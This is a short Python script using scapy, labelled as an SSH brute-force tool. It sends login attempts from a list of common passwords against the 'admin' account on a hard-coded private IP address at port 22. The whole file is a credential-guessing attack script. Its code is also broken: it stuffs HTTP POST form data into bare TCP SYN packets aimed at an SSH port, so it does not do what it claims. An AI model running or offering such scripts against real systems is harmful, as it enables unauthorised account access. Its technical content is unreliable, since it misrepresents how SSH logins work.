from scapy.all import send
from scapy.layers.inet import IP, TCP 
from scapy.packet import Raw

def ssh_brute_force(target_ip, target_port, username, passwords):
    for password in passwords:
        payload = f"username={username}&password={password}"
        
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, sport=12345, flags="S")
        raw = Raw(load=f"POST /login HTTP/1.1\r\nHost: {target_ip}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(payload)}\r\n\r\n{payload}")

        packet = ip/tcp/raw
        send(packet, verbose=0)
        print(f"SSH Brute Force attempt sent to {target_ip}:{target_port} with password: {password}")

target_ip = "192.168.1.66"
target_port = 22

passwords = ['password1', '12345', 'admin123', 'letmein', 'qwerty', 'abcdef']
ssh_brute_force(target_ip, target_port, 'admin', passwords)